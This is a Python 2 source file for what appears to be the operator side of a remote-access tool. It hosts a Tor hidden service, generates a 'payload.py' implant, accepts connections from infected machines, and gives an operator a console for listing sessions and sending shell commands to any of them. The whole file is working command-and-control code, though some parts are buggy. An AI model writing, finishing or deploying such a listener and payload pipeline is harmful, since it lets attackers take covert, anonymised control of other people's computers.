import socket
import time
import thread
import os
import subprocess
from Lib.Generator import Generator
from Listners.HiddenService import HiddenService
import sys

class Server:

    def __init__(self,port,payload,hiddenservice="new"):
        if hiddenservice == "new":            
            h = HiddenService(port,payload)
        self.sock = socket.socket()
        self.payload = payload
        self.addr = h.GetHostName()
        self.port = port
        self.clients = []
        data = raw_input("[!] do you want to compile the python payload(y:n) ")
        if data == "y":
            opts = {"compile" : True}
        if data == "n":
            opts = {"compile" : False}
        self.generated = Generator(self.payload,self.port,self.addr,"payload.py",opts)
        self.generated.handler()


    def run(self):
        print "[+] starting a Server"
        self.sock.bind(("127.0.0.1",self.port))        
        self.sock.listen(5)        
        counter = 1
        thread.start_new_thread(self.handler,())
        while 1:
            try:            
                conn,addr = self.sock.accept()
                c = Client(addr[0],addr[1],conn)
                self.clients.append(c)   
                print "[+] recived new session at channel: " + str(counter)
                counter += 1
                time.sleep(0.5)
            except Exception as e:
                print "an unkown error occured"
                print e

    def handler(self):        
        self.currentChannel = 0
        while 1:                        
            inp = raw_input("handler>")
            if inp.startswith("set"):
                self.currentChannel = int(inp.split(" ")[1]) - 1
                self.comunicate()
            elif inp.startswith("list"):
                tmpcounter = 0
                for c in self.clients:
                    tmpcounter += 1
                    print("[+] " + tmpcounter + "addr:" + c.addr)
            elif inp.startswith("get"):
                print self.get_data(inp.split(" ")[1])            
            elif inp == "help":
                self.helpscreen()
            elif inp == "exit":
                sys.exit()

    def helpscreen(self):
        print '''
        get \t get <hostname,count,port> to get the data 
        list \t lists all clients
        set \t set <id> gets into a shell with the client
        '''

    def get_data(self,data):
        if data == "hostname":
            return self.hostname
        elif data == "count":
            return len(self.clients)
        elif data == "port":
            return self.port
    
    def comunicate(self):
        while 1:    
            data = self.clients[self.currentChannel].conn.recv(1024)
            print(repr(data))
            cmd = raw_input(self.payload + "/sessions>")
            if cmd.startswith("change"):
                self.currentChannel = int(cmd.split(" ")[1])
                continue
            if cmd == "exit":
                break
            self.clients[self.currentChannel].conn.send(cmd.encode())

class Client:

    def __init__(self,addr,port,conn):
        self.addr = addr
        self.port = port
        self.conn = conn



            
    